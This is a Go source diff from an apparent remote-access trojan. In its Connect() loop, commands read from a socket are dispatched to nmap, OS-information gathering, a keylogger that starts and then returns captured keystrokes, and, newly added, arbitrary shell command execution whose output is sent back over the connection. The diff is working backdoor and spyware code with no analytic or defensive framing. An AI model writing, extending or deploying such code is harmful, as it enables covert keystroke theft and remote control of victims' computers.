@@ -57,12 +57,19 @@ func Connect() {
 		// When the command received aren't encoded,
 		// skip switch, and be executed on OS shell.
 		decodedCommand := ReadMesg(conn)
-		switch string(decodedCommand) {
-		case "nmap":
+		socketinfocommand := SocketInfo{}
+		json.Unmarshal([]byte(decodedCommand), &socketinfocommand)
+		print(socketinfocommand.ResultMsg + "\n")
+		print(socketinfocommand.ResultCode)
+		print("\n")
+		print(decodedCommand)
+		print("\n")
+		switch socketinfocommand.ResultCode {
+		case config.Request_Code_Nmap:
 			print("execute nmap")
 			//go service.GetNmapInfoFromIp("10.59.13.137")
 		//SendMesg(conn, "run nmap")
-		case "getos":
+		case config.Request_Code_GetRunGetOs:
 			var msg SocketInfo
 			msg.ResultCode = config.Result_Code_ReturnOsInfo
 			msg.ResultMsg = hackpackage.GetOSInformation()
@@ -71,7 +78,7 @@ func Connect() {
 			jsonstring, _ := json.Marshal(msg)
 			print(string(jsonstring))
 			SendMesg(conn, string(jsonstring))
-		case "keylogger_start":
+		case config.Request_Code_KeyLogger_Start:
 			print("you into keylogger_start")
 			if !keylogger.StartKeyLogger() {
 				var msg SocketInfo
@@ -90,7 +97,7 @@ func Connect() {
 				print(string(jsonstring))
 				SendMesg(conn, string(jsonstring))
 			}
-		case "keylogger_show":
+		case config.Request_Code_KeyLogger_Show:
 			if !keylogger.EndKeyLogger() {
 				var msg SocketInfo
 				msg.ResultCode = config.Result_Code_KeyLoggerNotOpen
@@ -107,6 +114,16 @@ func Connect() {
 				print(string(jsonstring))
 				SendMesg(conn, string(jsonstring))
 			}
+		case config.Request_Code_RunCmd:
+			print("cmd:" + socketinfocommand.ResultMsg)
+			print("\n")
+			result := hackpackage.ExecCmd(socketinfocommand.ResultMsg)
+			var msg SocketInfo
+			msg.ResultCode = config.Request_Code_Result_Code_Cmd
+			msg.ResultMsg = string(result)
+			jsonstring, _ := json.Marshal(msg)
+			print(string(jsonstring))
+			SendMesg(conn, string(jsonstring))
 
 		} // end switch
 
